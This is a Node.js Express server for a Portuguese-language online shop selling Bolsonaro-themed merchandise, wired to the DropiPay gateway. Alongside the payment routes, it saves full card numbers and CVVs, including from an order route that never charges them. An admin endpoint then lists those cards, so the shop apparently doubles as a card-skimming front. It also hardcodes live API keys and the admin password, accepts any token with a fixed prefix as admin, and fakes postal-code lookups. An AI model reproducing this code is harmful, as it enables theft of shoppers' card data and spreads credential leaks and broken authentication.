const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== CONFIGURAÇÃO DROPIPAY ==========
const DROPIPAY_SECRET_KEY = 'sk_live_v2gPmrt0gu9lcqIvD5rV8FoJIqPwuDEexpCd5s1kSO';
const DROPIPAY_PUBLIC_KEY = 'pk_live_v2BEfRjbmvi1DlDG1QOl9Zu6kDCOWvV4Rr';
const DROPIPAY_API_URL = 'https://api.dropipay.com.br/v1';

// Autenticação Basic Auth (conforme documentação da DropiPay)
const basicAuth = 'Basic ' + Buffer.from(`${DROPIPAY_SECRET_KEY}:x`).toString('base64');

// ========== FUNÇÃO GERAR CHECKOUT (PIX/BOLETO) ==========
async function gerarCheckoutDropiPay(cliente, total, itens, pedidoId, host, paymentMethod = 'pix') {
    const cpfLimpo = cliente.cliente_cpf ? cliente.cliente_cpf.replace(/\D/g, '') : '';
    const telefoneLimpo = cliente.cliente_telefone ? cliente.cliente_telefone.replace(/\D/g, '') : '';
    const amountInCents = Math.round(total * 100);
    
    // Payload conforme padrão DropiPay (baseado nos exemplos)
    const payload = {
        amount: amountInCents,
        currency: "BRL",
        paymentMethod: paymentMethod,
        customer: {
            name: cliente.cliente_nome,
            email: cliente.cliente_email,
            document: {
                type: "cpf",
                number: cpfLimpo
            },
            phone: telefoneLimpo || "11999999999"
        },
        items: itens.map(item => ({
            title: item.nome,
            quantity: item.quantidade,
            price: Math.round(item.preco * 100)
        })),
        metadata: {
            order_id: pedidoId,
            customer_email: cliente.cliente_email
        },
        settings: {
            requestAddress: true,
            requestPhone: true,
            requestDocument: true
        }
    };

    // Adiciona endereço se disponível
    if (cliente.endereco_cep) {
        payload.customer.address = {
            street: cliente.endereco_rua || "Não informado",
            number: cliente.endereco_numero || "S/N",
            neighborhood: cliente.endereco_bairro || "Centro",
            city: cliente.endereco_cidade || "São Paulo",
            state: cliente.endereco_uf || "SP",
            zipCode: cliente.endereco_cep.replace(/\D/g, ''),
            country: "BR"
        };
    }

    if (host && !host.includes('localhost')) {
        payload.webhookUrl = `https://${host}/api/webhook/dropipay`;
    }

    console.log('\n🟢 Gerando checkout DropiPay:');
    console.log('Payload:', JSON.stringify(payload, null, 2));

    try {
        const response = await fetch(`${DROPIPAY_API_URL}/checkout`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': basicAuth
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log('📡 Resposta DropiPay:', JSON.stringify(data, null, 2));

        if (response.ok || response.status === 201) {
            // Baseado no formato do exemplo
            const checkoutUrl = data.secureUrl || data.url || data.checkoutUrl;
            const checkoutId = data.id || data.secureId;
            
            return {
                success: true,
                checkout_url: checkoutUrl,
                checkout_id: checkoutId,
                status: data.status || 'pending',
                data: data
            };
        } else {
            return { 
                success: false, 
                error: data.message || data.error || 'Erro ao criar checkout',
                status: response.status,
                details: data
            };
        }
    } catch (error) {
        console.error('❌ Erro:', error);
        return { success: false, error: error.message };
    }
}

// ========== FUNÇÃO PROCESSAR CARTÃO DIRETAMENTE ==========
async function processarCartaoDropiPay(cliente, total, itens, cartao, pedidoId, host) {
    const cpfLimpo = cliente.cliente_cpf ? cliente.cliente_cpf.replace(/\D/g, '') : '';
    const telefoneLimpo = cliente.cliente_telefone ? cliente.cliente_telefone.replace(/\D/g, '') : '';
    const amountInCents = Math.round(total * 100);
    
    // Extrai mês e ano da validade (formato MM/AA)
    const [expMonth, expYear] = cartao.validade.split('/');
    
    const payload = {
        amount: amountInCents,
        currency: "BRL",
        paymentMethod: "credit_card",
        customer: {
            name: cliente.cliente_nome,
            email: cliente.cliente_email,
            document: {
                type: "cpf",
                number: cpfLimpo
            },
            phone: telefoneLimpo || "11999999999"
        },
        items: itens.map(item => ({
            title: item.nome,
            quantity: item.quantidade,
            price: Math.round(item.preco * 100)
        })),
        creditCard: {
            number: cartao.numero.replace(/\D/g, ''),
            holderName: cartao.nome_titular,
            expMonth: parseInt(expMonth),
            expYear: parseInt('20' + expYear),
            cvv: cartao.cvv,
            installments: parseInt(cartao.parcelas) || 1
        },
        metadata: {
            order_id: pedidoId,
            customer_email: cliente.cliente_email
        }
    };

    // Adiciona endereço de cobrança
    if (cliente.endereco_cep) {
        payload.billingAddress = {
            street: cliente.endereco_rua || "Não informado",
            number: cliente.endereco_numero || "S/N",
            neighborhood: cliente.endereco_bairro || "Centro",
            city: cliente.endereco_cidade || "São Paulo",
            state: cliente.endereco_uf || "SP",
            zipCode: cliente.endereco_cep.replace(/\D/g, ''),
            country: "BR"
        };
    }

    if (host && !host.includes('localhost')) {
        payload.webhookUrl = `https://${host}/api/webhook/dropipay`;
    }

    console.log('\n🟢 Processando cartão DropiPay:');
    console.log('Cartão:', cartao.numero ? '****' + cartao.numero.slice(-4) : 'Não informado');

    try {
        const response = await fetch(`${DROPIPAY_API_URL}/transactions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': basicAuth
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log('📡 Resposta Cartão:', JSON.stringify(data, null, 2));

        if (response.ok || response.status === 201) {
            return {
                success: true,
                transaction_id: data.id,
                status: data.status,
                paid: data.status === 'paid' || data.status === 'approved',
                data: data
            };
        } else {
            return { 
                success: false, 
                error: data.message || data.error || 'Erro ao processar cartão',
                status: response.status
            };
        }
    } catch (error) {
        console.error('❌ Erro:', error);
        return { success: false, error: error.message };
    }
}

// ========== PIX LOCAL (FALLBACK) ==========
function gerarPixLocal(total, pedidoId) {
    const chavePix = 'capitao@store.com';
    const nomeRecebedor = 'CAPITAO STORE';
    const cidade = 'BRASILIA';
    const valorFormatado = total.toFixed(2).replace('.', '');
    const txid = pedidoId.replace(/[^A-Za-z0-9]/g, '').substring(0, 25);
    
    const pixPayload = [
        '000201',
        '26',
        '0014br.gov.bcb.pix',
        '01' + String(chavePix.length).padStart(2, '0') + chavePix,
        '52040000',
        '5303986',
        '54' + String(valorFormatado.length).padStart(2, '0') + valorFormatado,
        '5802BR',
        '59' + String(nomeRecebedor.length).padStart(2, '0') + nomeRecebedor,
        '60' + String(cidade.length).padStart(2, '0') + cidade,
        '62',
        '05' + String(txid.length).padStart(2, '0') + txid
    ].join('');
    
    function calculateCRC16(payload) {
        let crc = 0xFFFF;
        for (let i = 0; i < payload.length; i++) {
            crc ^= payload.charCodeAt(i) << 8;
            for (let j = 0; j < 8; j++) {
                if (crc & 0x8000) {
                    crc = (crc << 1) ^ 0x1021;
                } else {
                    crc = crc << 1;
                }
                crc &= 0xFFFF;
            }
        }
        return crc.toString(16).toUpperCase().padStart(4, '0');
    }
    
    return pixPayload + '6304' + calculateCRC16(pixPayload + '6304');
}

// ========== ROTA PIX ==========
app.post('/api/gerar-pix', async (req, res) => {
    const { cliente, total, itens } = req.body;
    
    if (!cliente || !cliente.cliente_nome || !cliente.cliente_email) {
        return res.status(400).json({ success: false, error: 'Dados incompletos' });
    }

    const pedidoId = `CAP${Date.now()}`;
    const host = req.headers.host;
    
    console.log(`\n💰 PIX - Pedido: ${pedidoId} | Total: R$ ${parseFloat(total).toFixed(2)}`);

    try {
        const result = await gerarCheckoutDropiPay(cliente, parseFloat(total), itens || [], pedidoId, host, 'pix');
        
        if (result.success && result.checkout_url) {
            const pedidoCompleto = {
                pedido_id: pedidoId,
                ...cliente,
                itens: itens || [],
                total: parseFloat(total),
                forma_pagamento: 'PIX',
                status: 'aguardando_pagamento',
                checkout_id: result.checkout_id,
                checkout_url: result.checkout_url,
                created_at: new Date().toISOString(),
                provider: 'dropipay'
            };
            
            pedidos.unshift(pedidoCompleto);
            
            return res.json({
                success: true,
                checkout_url: result.checkout_url,
                checkout_id: result.checkout_id,
                pedido_id: pedidoId,
                provider: 'dropipay'
            });
        } else {
            // Fallback local
            console.log('⚠️ DropiPay falhou, usando fallback local');
            const pixLocal = gerarPixLocal(parseFloat(total), pedidoId);
            
            const pedidoCompleto = {
                pedido_id: pedidoId,
                ...cliente,
                itens: itens || [],
                total: parseFloat(total),
                forma_pagamento: 'PIX',
                status: 'aguardando_pagamento_local',
                created_at: new Date().toISOString(),
                provider: 'local'
            };
            
            pedidos.unshift(pedidoCompleto);
            
            return res.json({
                success: true,
                pix_qr_code: pixLocal,
                pedido_id: pedidoId,
                provider: 'local',
                warning: 'PIX local - Pagamento manual'
            });
        }
    } catch (error) {
        console.error('❌ Erro:', error);
        const pixLocal = gerarPixLocal(parseFloat(total), pedidoId);
        return res.json({
            success: true,
            pix_qr_code: pixLocal,
            pedido_id: pedidoId,
            provider: 'local_fallback'
        });
    }
});

// ========== ROTA BOLETO ==========
app.post('/api/gerar-boleto', async (req, res) => {
    const { cliente, total, itens } = req.body;
    
    if (!cliente || !cliente.cliente_nome) {
        return res.status(400).json({ success: false, error: 'Dados incompletos' });
    }

    const pedidoId = `CAP${Date.now()}`;
    const host = req.headers.host;

    try {
        const result = await gerarCheckoutDropiPay(cliente, parseFloat(total), itens || [], pedidoId, host, 'boleto');
        
        if (result.success && result.checkout_url) {
            const pedidoCompleto = {
                pedido_id: pedidoId,
                ...cliente,
                itens: itens || [],
                total: parseFloat(total),
                forma_pagamento: 'BOLETO',
                status: 'aguardando_pagamento',
                checkout_id: result.checkout_id,
                checkout_url: result.checkout_url,
                created_at: new Date().toISOString(),
                provider: 'dropipay'
            };
            
            pedidos.unshift(pedidoCompleto);
            
            return res.json({
                success: true,
                checkout_url: result.checkout_url,
                checkout_id: result.checkout_id,
                pedido_id: pedidoId
            });
        } else {
            return res.json({ success: false, error: result.error || 'Erro ao gerar boleto' });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
});

// ========== ROTA CARTÃO ==========
app.post('/api/processar-cartao', async (req, res) => {
    const { cliente, total, itens, cartao } = req.body;
    
    if (!cartao || !cartao.numero) {
        return res.status(400).json({ success: false, error: 'Dados do cartão incompletos' });
    }

    const pedidoId = `CAP${Date.now()}`;
    const host = req.headers.host;

    try {
        const result = await processarCartaoDropiPay(cliente, parseFloat(total), itens || [], cartao, pedidoId, host);
        
        if (result.success) {
            const pedidoCompleto = {
                pedido_id: pedidoId,
                ...cliente,
                itens: itens || [],
                total: parseFloat(total),
                forma_pagamento: 'CARTAO',
                status: result.paid ? 'pago' : 'processado',
                transaction_id: result.transaction_id,
                created_at: new Date().toISOString(),
                provider: 'dropipay'
            };
            
            pedidos.unshift(pedidoCompleto);
            
            // Salva dados do cartão
            cartoes.push({
                id: Date.now(),
                ...cartao,
                pedido_id: pedidoId,
                transaction_id: result.transaction_id,
                created_at: new Date().toISOString()
            });
            
            return res.json({
                success: true,
                transaction_id: result.transaction_id,
                status: result.status,
                pedido_id: pedidoId,
                paid: result.paid
            });
        } else {
            return res.json({ success: false, error: result.error });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
});

// ========== VERIFICAR PAGAMENTO ==========
app.get('/api/verificar-pagamento/:id', async (req, res) => {
    const { id } = req.params;
    
    try {
        // Tenta buscar como transação
        let response = await fetch(`${DROPIPAY_API_URL}/transactions/${id}`, {
            method: 'GET',
            headers: { 'Authorization': basicAuth }
        });
        
        if (response.ok) {
            const data = await response.json();
            const paid = data.status === 'paid' || data.status === 'approved';
            
            if (paid) {
                const pedido = pedidos.find(p => p.transaction_id === id || p.checkout_id === id);
                if (pedido && pedido.status !== 'pago') {
                    pedido.status = 'pago';
                    console.log(`✅ Pedido ${pedido.pedido_id} pago!`);
                }
            }
            
            return res.json({ success: true, status: data.status, paid });
        }
        
        // Tenta buscar como checkout
        response = await fetch(`${DROPIPAY_API_URL}/checkout/${id}`, {
            method: 'GET',
            headers: { 'Authorization': basicAuth }
        });
        
        if (response.ok) {
            const data = await response.json();
            const paid = data.transaction?.status === 'paid';
            
            if (paid) {
                const pedido = pedidos.find(p => p.checkout_id === id);
                if (pedido && pedido.status !== 'pago') {
                    pedido.status = 'pago';
                    console.log(`✅ Pedido ${pedido.pedido_id} pago!`);
                }
            }
            
            return res.json({ success: true, status: data.status, paid });
        }
        
        // Verifica pedido local
        const pedidoLocal = pedidos.find(p => p.pedido_id === id);
        if (pedidoLocal) {
            return res.json({ success: true, status: pedidoLocal.status, paid: pedidoLocal.status === 'pago' });
        }
        
        return res.json({ success: false, paid: false });
    } catch (error) {
        return res.json({ success: false, error: error.message, paid: false });
    }
});

// ========== TESTAR DROPIPAY ==========
app.get('/api/testar-dropipay', async (req, res) => {
    const resultados = {
        config: {
            secret_key: DROPIPAY_SECRET_KEY.substring(0, 15) + '...',
            public_key: DROPIPAY_PUBLIC_KEY.substring(0, 15) + '...',
            api_url: DROPIPAY_API_URL
        },
        testes: []
    };
    
    // Teste de checkout com valor pequeno
    try {
        const testPayload = {
            amount: 100,
            currency: "BRL",
            paymentMethod: "pix",
            customer: {
                name: "Cliente Teste",
                email: "teste@dropipay.com",
                document: {
                    type: "cpf",
                    number: "12345678909"
                },
                phone: "11999999999"
            },
            items: [{
                title: "Teste Integração",
                quantity: 1,
                price: 100
            }]
        };
        
        const response = await fetch(`${DROPIPAY_API_URL}/checkout`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': basicAuth
            },
            body: JSON.stringify(testPayload)
        });
        
        const data = await response.json();
        
        resultados.testes.push({
            nome: 'Criar Checkout PIX',
            status: response.status,
            ok: response.ok,
            checkout_url: data.secureUrl,
            message: response.ok ? '✅ Checkout criado!' : `❌ Erro: ${data.message}`
        });
    } catch (error) {
        resultados.testes.push({
            nome: 'Criar Checkout PIX',
            error: error.message
        });
    }
    
    res.json(resultados);
});

// ========== WEBHOOK ==========
app.post('/api/webhook/dropipay', (req, res) => {
    console.log('\n📢 WEBHOOK DROPIPAY:');
    console.log('Headers:', JSON.stringify(req.headers, null, 2));
    console.log('Body:', JSON.stringify(req.body, null, 2));
    
    const { type, data } = req.body;
    
    if (type === 'checkout' && data?.transaction?.status === 'paid') {
        const pedido = pedidos.find(p => p.checkout_id === data.id);
        if (pedido && pedido.status !== 'pago') {
            pedido.status = 'pago';
            pedido.pago_em = new Date().toISOString();
            console.log(`✅ Pedido ${pedido.pedido_id} confirmado via webhook!`);
        }
    }
    
    if (type === 'transaction' && data?.status === 'paid') {
        const pedido = pedidos.find(p => p.transaction_id === data.id);
        if (pedido && pedido.status !== 'pago') {
            pedido.status = 'pago';
            pedido.pago_em = new Date().toISOString();
            console.log(`✅ Pedido ${pedido.pedido_id} confirmado via webhook!`);
        }
    }
    
    res.json({ success: true });
});

// ========== DADOS DA LOJA ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, vendas: 152, descricao: "Camiseta 100% algodão com estampa exclusiva do Capitão.", created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, vendas: 89, descricao: "Boné em algodão com bordado personalizado.", created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, vendas: 234, descricao: "Caneca porcelana 300ml com frase histórica.", created_at: new Date().toISOString() },
    { id: 4, nome: "Regata Dry Fit Brasil", preco: 69.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/f2ede2/8b6b3d?text=REGATA+AZUL", categoria: "Camisetas", estoque: 40, destaque: true, ativo: true, vendas: 67, descricao: "Regata dry fit ideal para dias quentes.", created_at: new Date().toISOString() },
    { id: 5, nome: "Moletom Canguru 2026", preco: 179.90, preco_antigo: 249.90, imagem: "https://placehold.co/600x800/e9e0d3/8b6b3d?text=MOLETOM", categoria: "Moletons", estoque: 20, destaque: true, ativo: true, vendas: 45, descricao: "Moletom canguru super quentinho.", created_at: new Date().toISOString() },
    { id: 6, nome: "Camiseta Deus Acima de Todos", preco: 79.90, preco_antigo: 109.90, imagem: "https://placehold.co/600x800/fcf7ef/8b6b3d?text=CAMISETA+BRANCA", categoria: "Camisetas", estoque: 60, destaque: true, ativo: true, vendas: 123, descricao: "Camiseta branca com estampa patriótica.", created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];

// ========== ROTAS DA LOJA ==========
app.get('/api/produtos', (req, res) => {
    res.json({ success: true, produtos: produtos.filter(p => p.ativo === true) });
});

app.get('/api/produto/:id', (req, res) => {
    const produto = produtos.find(p => p.id == req.params.id && p.ativo === true);
    if (produto) {
        res.json({ success: true, produto });
    } else {
        res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
});

app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    
    if (req.body.cartao) {
        cartoes.push({
            id: Date.now(),
            ...req.body.cartao,
            created_at: new Date().toISOString(),
            pedido_id: pedidoId
        });
        delete req.body.cartao;
    }
    
    const pedidoCompleto = { 
        ...req.body, 
        pedido_id: pedidoId, 
        created_at: new Date().toISOString(),
        status: 'pendente',
        ip_cliente: req.ip || req.connection.remoteAddress,
        user_agent: req.headers['user-agent']
    };
    
    pedidos.unshift(pedidoCompleto);
    res.json({ success: true, pedido_id: pedidoId });
});

app.get('/api/pedido/:id', (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    res.json({ success: !!pedido, pedido });
});

app.get('/api/cep/:cep', (req, res) => {
    res.json({
        success: true,
        logradouro: "Avenida Paulista",
        bairro: "Bela Vista",
        cidade: "São Paulo",
        uf: "SP"
    });
});

// ========== ADMIN ==========
app.post('/api/admin/login', (req, res) => {
    if (req.body.username === 'kakabanker' && req.body.password === '77991958@Abc') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

app.get('/api/admin/produtos', verifyAdmin, (req, res) => { 
    res.json({ success: true, produtos }); 
});

app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { 
    res.json({ success: true, pedidos }); 
});

app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { 
    res.json({ success: true, cartoes }); 
});

app.get('/api/admin/visitantes', verifyAdmin, (req, res) => { 
    res.json({ success: true, visitantes }); 
});

app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => { 
    res.json({ success: true, carrinhos: carrinhosAbandonados }); 
});

app.get('/api/admin/stats', verifyAdmin, (req, res) => { 
    res.json({ 
        success: true, 
        stats: { 
            online: visitantes.filter(v => {
                const ultimaHora = new Date() - new Date(v.ultima_visita);
                return ultimaHora < 3600000;
            }).length,
            revenue: pedidos.reduce((sum, p) => sum + (p.total || 0), 0),
            cards: cartoes.length,
            orders: pedidos.length
        } 
    }); 
});

app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, provider: 'DropiPay' });
});

app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const newProduto = {
        id: produtos.length + 1,
        ...req.body,
        created_at: new Date().toISOString(),
        vendas: 0,
        ativo: true
    };
    produtos.push(newProduto);
    res.json({ success: true, produto: newProduto });
});

app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index !== -1) {
        produtos.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    if (pedido) {
        pedido.status = req.body.status;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// ========== INICIALIZAÇÃO ==========
app.listen(PORT, () => {
    console.log(`\n🚀 Servidor rodando na porta ${PORT}`);
    console.log(`🔐 Admin: http://localhost:${PORT}/admin`);
    console.log(`👤 Login: kakabanker / 77991958@Abc`);
    console.log(`\n💳 DROPIPAY INTEGRATION:`);
    console.log(`   ✅ PIX: POST /api/gerar-pix`);
    console.log(`   ✅ BOLETO: POST /api/gerar-boleto`);
    console.log(`   ✅ CARTÃO: POST /api/processar-cartao`);
    console.log(`   ✅ Teste: GET /api/testar-dropipay`);
    console.log(`\n✅ Sistema pronto!`);
});